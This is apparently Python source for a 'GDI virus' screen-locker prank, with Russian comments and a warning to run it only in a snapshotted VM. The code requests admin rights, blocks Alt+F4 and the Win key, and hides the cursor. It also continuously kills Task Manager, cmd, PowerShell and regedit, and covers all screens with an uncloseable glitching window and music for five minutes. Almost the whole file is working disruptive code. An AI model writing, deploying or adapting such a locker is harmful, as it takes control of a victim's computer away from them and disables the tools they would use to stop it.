# language: Python, file: gdi_virus.py
# Зависимости: pillow pygame keyboard psutil
# ВНИМАНИЕ: Блокирует управление на 5 минут. Запускать ТОЛЬКО в VM со снапшотом.

import tkinter as tk
from PIL import Image, ImageTk, ImageGrab, ImageEnhance, ImageDraw
import pygame
import threading
import time
import random
import ctypes
import os
import sys
import psutil

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

# ================= НАСТРОЙКИ =================
DURATION = 300  # Длительность 5 минут
BLOCK_EXE = {"taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe"}
MUSIC_FILE = "music.mp3"

# ================= БЛОКИРОВКА =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except Exception:
        pass
    sys.exit(0)

def install_blocks():
    if HAS_KEYBOARD:
        try:
            keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
            keyboard.block_key('win')
        except Exception:
            pass
    
    # Прячем курсор
    try:
        ctypes.windll.user32.ShowCursor(False)
    except Exception:
        pass

def kill_blocked():
    while True:
        for proc in psutil.process_iter(["name"]):
            try:
                if (proc.info["name"] or "").lower() in BLOCK_EXE:
                    proc.kill()
            except Exception:
                pass
        time.sleep(0.2)

# ================= ВИЗУАЛЬНЫЙ ДВИЖОК =================
class GDIVirus:
    def __init__(self, root):
        self.root = root
        self.root.title("GDI_VIRUS")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.width = self.root.winfo_screenwidth()
        self.height = self.root.winfo_screenheight()
        
        # 1. Делаем скриншот (исправлено: all_screens=True)
        try:
            self.bg_img = ImageGrab.grab(all_screens=True)
        except Exception:
            self.bg_img = Image.new("RGB", (self.width, self.height), "black")
        
        self.canvas = tk.Canvas(root, width=self.width, height=self.height, bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        # 2. Готовим глючный фон
        self.glitch_img = self.make_glitch_image()
        
        # 3. Создаем фон ОДИН РАЗ (исправлено: убрали мерцание)
        self.bg_item = self.canvas.create_image(0, 0, image=self.glitch_img, anchor="nw")
        
        # 4. Готовим крестики
        self.cross_img = self.make_cross_image()
        self.active_crosses = []
        
        # 5. Музыка
        self.play_music()
        
        # 6. Старт
        self.start_time = time.time()
        self.animate()

    def make_glitch_image(self):
        # Исправлено: принудительный ресайз и convert("RGB") чтобы Image.blend не упал
        try:
            img = self.bg_img.resize((self.width, self.height)).convert("RGB")
        except Exception:
            img = Image.new("RGB", (self.width, self.height), "black")

        draw_glitch = Image.new("RGB", (self.width, self.height), "black")
        pixels = draw_glitch.load()
        
        # Рисуем диагональные полосы (как на фото)
        for x in range(self.width):
            for y in range(0, self.height, 4):
                if random.random() > 0.7:
                    pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                    
        result = Image.blend(img, draw_glitch, alpha=0.4)
        enhancer = ImageEnhance.Color(result)
        result = enhancer.enhance(2.5)
        
        return ImageTk.PhotoImage(result)

    def make_cross_image(self):
        cross_size = 32
        cross = Image.new("RGBA", (cross_size, cross_size), (0, 0, 0, 0))
        draw = ImageDraw.Draw(cross)
        draw.ellipse((0, 0, cross_size - 1, cross_size - 1), fill="#dc3545", outline="#ff0000", width=2)
        offset = 10
        draw.line((offset, offset, cross_size - offset, cross_size - offset), fill="white", width=3)
        draw.line((offset, cross_size - offset, cross_size - offset, offset), fill="white", width=3)
        return ImageTk.PhotoImage(cross)

    def play_music(self):
        try:
            pygame.mixer.init()
            if os.path.exists(MUSIC_FILE):
                pygame.mixer.music.load(MUSIC_FILE)
                pygame.mixer.music.play(-1)
        except Exception:
            pass

    def spawn_cross(self):
        x = random.randint(100, self.width - 100)
        y = random.randint(100, self.height - 100)
        item_id = self.canvas.create_image(x, y, image=self.cross_img, anchor="center")
        self.active_crosses.append({
            "id": item_id,
            "x": x, "y": y,
            "vx": random.choice([-5, -3, 3, 5]),
            "vy": random.choice([-5, -3, 3, 5])
        })

    def animate(self):
        elapsed = time.time() - self.start_time
        
        if elapsed > DURATION:
            self.quit()
            return
            
        # 1. Двигаем фон (исправлено: coords вместо delete/create)
        x_offset = random.randint(-10, 10)
        y_offset = random.randint(-10, 10)
        self.canvas.coords(self.bg_item, x_offset, y_offset)
        
        # 2. Спавн крестиков
        spawn_rate = 0.15 if elapsed < 30 else 0.03
        if random.random() < spawn_rate and len(self.active_crosses) < 250:
            self.spawn_cross()
            
        # 3. Движение крестиков
        for c in self.active_crosses:
            c["x"] += c["vx"]
            c["y"] += c["vy"]
            
            # Отскок от краев (исправлено: защита от нулевой скорости)
            if c["x"] < 0 or c["x"] > self.width:
                c["vx"] = -c["vx"] if c["vx"] != 0 else random.choice([-5, 5])
            if c["y"] < 0 or c["y"] > self.height:
                c["vy"] = -c["vy"] if c["vy"] != 0 else random.choice([-5, 5])
                
            self.canvas.coords(c["id"], c["x"], c["y"])
            
            # Случайное дерганье (эффект помех)
            if random.random() < 0.01:
                c["vx"] += random.choice([-2, 2])
                c["vy"] += random.choice([-2, 2])

        self.root.after(33, self.animate)

    def quit(self):
        try:
            ctypes.windll.user32.ShowCursor(True)
            pygame.mixer.music.stop()
            self.root.destroy()
        except Exception:
            pass

if __name__ == "__main__":
    ensure_admin()
    install_blocks()
    threading.Thread(target=kill_blocked, daemon=True).start()
    
    root = tk.Tk()
    app = GDIVirus(root)
    root.mainloop()
